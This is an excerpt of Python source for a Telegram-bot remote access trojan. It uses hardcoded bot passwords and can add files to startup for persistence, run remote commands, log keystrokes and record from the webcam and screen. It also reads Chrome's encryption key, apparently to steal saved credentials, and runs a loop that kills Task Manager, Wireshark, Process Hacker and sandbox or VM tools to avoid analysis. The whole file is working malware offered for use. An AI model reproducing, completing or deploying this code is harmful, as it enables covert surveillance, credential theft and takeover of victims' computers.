_BL='joeboxserver.exe'
_BK='ksdumper.exe'
_BJ='ksdumperclient.exe'
_BI='joeboxcontrol.exe'
_BH='qemu-ga.exe'
_BG='xenservice.exe'
_BF='prl_tools.exe'
_BE='prl_cc.exe'
...
_B2='fiddler.exe'
_B1='wireshark.exe'
_B0='httpdebuggerui.exe'
_A_='dumpcap.exe'
_Az='fakenet.exe'
_Ay='vmwareuser.exe'
_Ax='explorer.exe'
_Aw='ProcessHacker.exe'
_Av='Taskmgr.exe'
_Au='perfmon.exe'
_At='wmic process get description'
_As='Windows is blocked!'
_Ar='Enter record time:'
_Aq='Keylogger stopped!'
_Ap='User Data'
_Ao='USERPROFILE'
_An='waiting_for_path'
_Am='password is wrong'
_Al='Logged successfully!'
_Ak='Connection!'
_Aj='Enter password:'
_Ai='attrib +h r.txt'
_Ah='tasklist'
...
def start(message):
	...
	else:bot.send_message(A.chat.id,_Ak);B=os.popen(_Q).read().strip();bot.send_message(A.chat.id,f"You can use /help");bot.send_message(A.chat.id,f"Pc's name is: {B}")
def checkpass(message):
	A=message
	if A.text=='Blackmercury2007!@#':global n;n=_A;bot.send_message(A.chat.id,_Al);bot.send_message(A.chat.id,_Ak);B=os.popen(_Q).read().strip();bot.send_message(A.chat.id,f"You can use /help");bot.send_message(A.chat.id,f"Pc name is: {B}")
	else:bot.send_message(A.chat.id,_Am)
user_state={}
@bot.message_handler(commands=['addstartup'])
def add_startup(message):A=message;bot.send_message(A.chat.id,'Enter the name of your exe file (full path):');user_state[A.chat.id]=_An
@bot.message_handler(func=lambda message:user_state.get(message.chat.id)==_An)
def handle_executable_path(message):
	...
	if not os.path.exists(B):bot.send_message(A.chat.id,'The specified file does not exist. Please try again.')
	elif not B.lower().endswith('.exe'):bot.send_message(A.chat.id,'Please provide a valid .exe file path.')
	elif os.path.isdir(C):
		D=os.path.basename(B);E=os.path.join(C,D)
		try:shutil.copyfile(B,E);bot.send_message(A.chat.id,f"{D} added to startup successfully!")
		except Exception as F:bot.send_message(A.chat.id,f"Failed to add to startup: {F}")
	else:bot.send_message(A.chat.id,'Startup folder not found.')
	user_state.pop(A.chat.id,_G)
@bot.message_handler(commands=['filepath'])
def get_file_path(message):
	A=message
	try:B=os.path.abspath(__file__);bot.send_message(A.chat.id,str(B))
	except Exception as C:bot.send_message(A.chat.id,f"Failed to add to startup: {C}")
...
def get_encryption_key():
	C=os.path.join(os.environ[_Ao],'AppData','Local','Google','Chrome',_Ap,'Local State')
...
def stop_key(message):global end;end=1;bot.send_message(message.chat.id,_Aq)
...
def track_all_keys(message):
	...
	try:
		...
		def C(key):
			if end==1:bot.send_message(A.chat.id,_Aq);return _C
...
def github(message):A=message;bot.send_message(A.chat.id,'My github:');bot.send_message(A.chat.id,'[**GitHub - WhiteeRabbit**](https://github.com/WhiteeRabbit)')
...
def camv(message,camera_index):A=bot.send_message(message.chat.id,_Ar);bot.register_next_step_handler(A,lambda msg:camer(msg,camera_index,int(msg.text)))
...
def checkpasswd(message):
	A=message
	if A.text=='MomentoMori':global n;n=_A;bot.send_message(A.chat.id,_Al);bot.send_message(A.chat.id,textovik)
	else:bot.send_message(A.chat.id,_Am)
...
def screen(message):A=bot.send_message(message.chat.id,_Ar);bot.register_next_step_handler(A,scr)
def scr(message):
...
def winblocker(message):
	B=message;bot.send_message(B.chat.id,_As)
	while _A:
		C=os.popen(_At).read().strip();D=[_Au,_Av,_Aw,_Z,_Ax,_Ay,_Az,_A_,_B0,_B1,_B2,_B3,_B4,_B5,_B6,_B7,_B8,_B9,_BA,_BB,_BC,_BD,_BE,_BF,_BG,_BH,_BI,_BJ,_BK,_BL]
		for A in D:
			if A in C:
				if A==_Z:0
...
def winblocker(message):
	B=message;bot.send_message(B.chat.id,_As)
	while _A:
		C=os.popen(_Ah).read().strip();D=[_Au,_Av,_Aw,_Z,_Ax,_Ay,_Az,_A_,_B0,_B1,_B2,_B3,_B4,_B5,_B6,_B7,_B8,_B9,_BA,_BB,_BC,_BD,_BE,_BF,_BG,_BH,_BI,_BJ,_BK,_BL]
		for A in D:
			if A in C:
				if A==_Z:0
				else:bot.send_message(B.chat.id,f"{A} is killed!")
...
def command_execution(message):
	...
	try:
		...
		if len(C)>1:
			...
			os.remove(_I)
		A=os.popen(_At).read().strip();C=[A[B:B+MAX_MESSAGE_LENGTH]for B in range(0,len(A),MAX_MESSAGE_LENGTH)]
		if len(C)>1:
